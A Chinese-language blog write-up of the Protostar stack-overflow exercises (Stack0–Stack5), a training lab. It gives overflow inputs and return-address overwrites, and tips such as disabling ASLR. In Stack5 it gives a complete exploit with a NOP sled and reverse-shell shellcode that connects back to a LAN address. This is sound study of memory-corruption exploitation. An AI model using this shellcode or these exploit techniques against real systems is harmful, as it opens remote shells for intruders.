---
layout: post
title: Protostar WriteUp
catagories: [ctf-execrise]
tags: [ctf, writeup, protostar]
---

> 堆、栈、格式化字符串漏洞利用学习


##Stack0

`gets()`函数不检查输入长度是否已溢出，所以输入超过buffer的长度，自然会覆盖到栈上的其它变量，
而`Modified`变量是紧跟着`buffer[]`的，因此被改写。

```
$ ./stack0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
you have changed the 'modified' variable
$ 
```

##Stack1

这一题要求modified的变量值为`0x61626364`. 因为数据是小端表示的，因此传给modifed的字符串应该是`"dcba"`.

```
$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
you have correctly got the variable to the right value
$ 
```

##Stack2

因为`os.environ`改过的环境变量只在这个进程内部有效，进程外部无效，但其子进程是继承的父进程的环境变量，所以可以用`subprocess.Popen`来运行stack2

```python
import os
import subprocess
os.environ["GREENIE"]="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\x0a\x0d\x0a\x0d"
#print os.environ["GREENIE"]

cmd = "/opt/protostar/bin/stack2"
subprocess.Popen(cmd, close_fds=True, stderr=subprocess.PIPE, shell=True)
```

```
$ python ss.py
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


$ you have correctly modified the variable
```

##Stack3

`objdump -d stack3`，拿到win()的地址`0x08048424`

构造输入：

```
$ python -c "print 'A'*64 + '\x24\x84\x04\x08'"|./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
$ 
```

##Stack4

拿到win()的地址`080483f4`

因为有对齐，原来的栈顶`0xbffffc48`变成了`0xbffffc40`

eip在ebp的下方

因此，应填充的padd为64+8+4,下接win的地址

```python
python -c "print 'A'*64 + 'B'*8 +'C'*4 + '\xf4\x83\x04\x08'"
```

```
$  python -c "print 'A'*64 + 'B'*8 +'C'*4 + '\xf4\x83\x04\x08'"|./stack4
code flow successfully changed
Segmentation fault
```

##Stack5

几个技巧：

1. nasm与ndisasm很强大，一个汇编编译，一个反汇编
2. 调试时关闭地址随机化`echo 0 >/proc/sys/kernel/randomize_va_space`
3. pwntools和msfconsole很强大，生成shellcode的话，msfconsole很全
4. core dump很有必要，因为gdb下和真实运行还是有很大差别的.`ulimit -c unlimited`和`echo "/tmp/core-%e-%p-%t" > /proc/sys/kernel/core_pattern`

标准的栈溢出，试过n种shellcode,明显msfconsole生成的更灵活，exploit-db太多，不知如何选择
`http://shell-storm.org/shellcode/, http://www.exploit-db.com/`

```python
#!/usr/bin/env python

#shell = '31c9f7e96a01fe0c24682f2f7368682f62696eb00b89e3cd80'.decode("hex")

#shell = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73" +\
        #"\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00" +\
        #"\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd" +\
        #"\x80"

#buf =  ""
#buf += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
#buf += "\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0"
#buf += "\xa8\x01\x70\x68\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50"
#buf += "\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73"
#buf += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0"
#buf += "\x0b\xcd\x80"


buf =  ""
buf += "\x31\xc9\x31\xdb\xf7\xe3\xb0\xa4\xcd\x80\x31\xdb\x6a"
buf += "\x17\x58\xcd\x80\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02"
buf += "\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49"
buf += "\x79\xf9\x68\xc0\xa8\x01\x70\x68\x02\x00\x04\xd2\x89"
buf += "\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52"
buf += "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52"
buf += "\x53\x89\xe1\xb0\x0b\xcd\x80"


#buf =  ""
#buf += "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
#buf += "\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
#buf += "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

#shellcode = "\x90"*(76-len(buf))+buf+ "\x40\xfc\xff\xbf" //放在ebp前, 效果不好
shellcode = "A"*76 +"\x74\xfe\xff\xbf" + "\x90"*16 +  buf //放在ebp后

fd = open("shellcode", "w")
fd.write(shellcode)
```


